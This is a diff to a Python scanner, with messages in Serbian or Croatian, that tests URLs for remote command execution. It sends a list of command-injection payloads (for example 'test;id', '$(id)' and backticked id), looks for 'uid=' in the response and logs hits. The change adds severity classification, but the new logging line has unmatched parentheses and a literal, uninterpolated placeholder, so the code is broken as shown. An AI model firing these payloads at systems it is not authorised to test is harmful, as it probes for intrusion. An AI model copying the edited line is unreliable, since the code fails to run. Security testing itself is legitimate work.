@@ -1,5 +1,5 @@
 import requests
-from utils.log_utils import log_to_sheet
+from utils.log_utils import log_to_sheet, classify_severity
 
 RCE_PAYLOADS = [
     "test;id", "test|id", "$(id)", "`id`", "%24(id)", "test&&id"
@@ -13,7 +13,8 @@ def test_rce(url):
             response = requests.get(full_url, timeout=5)
             if "uid=" in response.text or "gid=" in response.text:
                 print(f"[!] Mogući RCE: {full_url}")
-                log_to_sheet(__file__, f"RCE: {full_url}")
+                severity = classify_severity(f"RCE: {full_url}")
+                log_to_sheet(__file__, f"RCE: {full_url}") + f' | Severity: {{severity}}')
     except Exception as e:
         print(f"[-] Greška: {e}")
 
